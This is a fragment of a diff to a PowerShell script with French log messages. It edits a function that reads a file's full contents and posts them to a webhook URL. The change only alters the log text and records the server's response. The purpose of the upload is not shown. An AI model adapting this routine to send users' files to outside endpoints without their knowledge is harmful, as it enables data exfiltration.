@@ -12,7 +12,7 @@ function Send-File {
     param ([string]$FilePath)
 
     # Log
-    Add-Content -Path $LogFile -Value "Envoi du fichier: $FilePath"
+    Add-Content -Path $LogFile -Value "Tentative d'envoi du fichier: $FilePath"
 
     $FileName = [System.IO.Path]::GetFileName($FilePath)
     $Boundary = [System.Guid]::NewGuid().ToString()
@@ -28,8 +28,8 @@ $(Get-Content -Raw -Path $FilePath)
     
     # Envoi du fichier au webhook
     try {
-        Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Body -Headers $Headers
-        Add-Content -Path $LogFile -Value "Fichier envoyé avec succès"
+        $Response = Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Body -Headers $Headers
+        Add-Content -Path $LogFile -Value "Réponse du serveur: $($Response | Out-String)"
     } catch {
         Add-Content -Path $LogFile -Value "Erreur lors de l'envoi du fichier: $_"
     }
